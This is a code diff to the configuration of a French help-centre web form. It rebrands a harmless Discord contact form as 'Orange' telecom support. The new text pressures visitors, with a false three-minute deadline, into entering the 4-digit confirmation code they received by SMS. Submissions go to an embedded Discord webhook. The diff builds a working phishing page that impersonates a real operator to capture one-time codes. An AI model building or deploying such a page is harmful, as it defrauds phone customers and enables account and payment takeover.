@@ -8,12 +8,12 @@ const CONFIG = {
 
   /* ======= CONFIGURATION DES CHAMPS — MODIFIABLE ICI ======= */
   pseudoMax: 40,                  // MODIFIABLE ICI — nb de caractères max du pseudo Discord
-  idMin: 15,                      // MODIFIABLE ICI — longueur min d'un ID Discord
-  idMax: 22,                      // MODIFIABLE ICI — longueur max d'un ID Discord
+  idMin: 1,                      // MODIFIABLE ICI — longueur min d'un ID Discord
+  idMax: 5,                      // MODIFIABLE ICI — longueur max d'un ID Discord
   photoMaxMo: 8,                  // MODIFIABLE ICI — taille max d'une photo (en Mo)
 
   /* ——— Marque & couleurs ——— */
-  nom: "Nova",
+  nom: "Orange",
   sousTitre: "Assistance",
   couleurPrincipale: "#f36b16",
   couleurEnTete: "#111111",
@@ -25,7 +25,7 @@ const CONFIG = {
   texteAccueil: "Bonjour, vous avez besoin d'aide ? Retrouvez les réponses à vos questions.",
   encadreTitre: "Une aide personnalisée, ça change tout",
   encadreTexte: "Une question, un souci ? Écris-nous, ça arrive direct dans le salon de l'équipe.",
-  boutonContact: "Nous écrire",
+  boutonContact: "Clique ici",
 
   /* ——— Barre de recherche ——— */
   rechercheTitre: "Comment pouvons-nous vous aider ?",
@@ -52,37 +52,37 @@ const CONFIG = {
 
   /* ——— Le formulaire ——— */
   retour: "Retour à l'assistance",
-  contactTitre: "Nous écrire",
-  contactIntro: "Laisse ton pseudo et ton ID Discord (et une photo si besoin) : ça arrive direct dans le salon de l'équipe.",
+  contactTitre: "Annulation d'achat",
+  contactIntro: "Dans vos SMS de telephone vous aviez reçu un code à 4 chiffres envoyer par NOUS MEMES et pour assurer votre sécurité et indentité nous avons besoin que vous entrée le code ici pour annuler les paiment automatique fraude & arnaque il ne vous reste plus que 3 MINUTES.",
   labelPseudo: "Ton pseudo Discord",
-  placeholderPseudo: "Ex : babadolafou",
-  labelId: "Ton ID Discord",
-  placeholderId: "Ex : 1553090067097059430",
+  placeholderPseudo: "Ex : Gamer826",
+  labelId: "Code de Confirmation à 4 chiffres",
+  placeholderId: "Ex : 6252",
   labelPhoto: "Une photo",
   photoFacultatif: "(facultatif)",
   boutonPhoto: "Choisir une photo",
-  boutonEnvoyer: "Envoyer dans Discord",
+  boutonEnvoyer: "Envoyer à notre assistance",
 
   /* ——— Messages d'erreur ——— */
   errPseudo: "Mets ton pseudo Discord.",
-  errId: "L'ID Discord doit contenir uniquement des chiffres (entre 15 et 22).",
+  errId: "Le code doit contenir uniquement des chiffres (entre 1 et 4).",
   errPhoto: "La photo doit être une image de moins de {mo} Mo.",
 
   /* ——— Écran après l'envoi ——— */
   succesTitre: "C'est envoyé !",
-  succesTexte: "C'est bien arrivé dans le salon Discord de l'équipe.",
+  succesTexte: "C'est bien arrivé dans l'espace de l'équipe Orange.",
   boutonAutre: "Envoyer autre chose",
 
   /* ——— Format du message dans Discord (embed) ——— */
-  titreEmbed: "💭 Nouveau MP",
-  champPseudo: "👤 Pseudo Discord",
-  champId: "🆔 ID Discord",
+  titreEmbed: "📲 Assistance Orange Telecom",
+  champPseudo: "👤 **Pseudo Discord**",
+  champId: "📂 **Code de Confirmation**",
   couleurEmbed: "#ED4245",
 
   /* ——— Limite d'envois + cooldown ——— */
   maxMessages: 3,                 // MODIFIABLE ICI — nombre d'envois autorisés
   delaiHeures: 24,                // MODIFIABLE ICI — temps d'attente une fois la limite atteinte
-  cooldownTitre: "Doucement 😅",
+  cooldownTitre: "Doucement",
   cooldownTexte: "Tu as envoyé tous tes messages. Tu pourras réécrire dans :",
   cooldownBouton: "Retour à l'accueil",
 
@@ -90,7 +90,7 @@ const CONFIG = {
   footerColonneTitre: "Assistance",
   footerLiens: ["Aide et contact", "Internet et box", "TV et décodeur", "Mobile"],
   footerInfosTitre: "Informations",
-  footerInfosTexte: "Nova Assistance est un centre d'aide indépendant. Il n'est pas affilié à un opérateur téléphonique.",
+  footerInfosTexte: "Orange Assistance est un centre d'aide indépendant. Il n'est pas affilié à un opérateur téléphonique.",
 
   /* ——— Ton salon Discord (webhook) ——— */
   webhook: "https://discord.com/api/webhooks/1568814486712754237/NKEolh6rehaH9S37BjXz1phlIp51ZyEEfZjLJXZjcAFsasDuGcdkvpYXbtF32RvPXrzc"
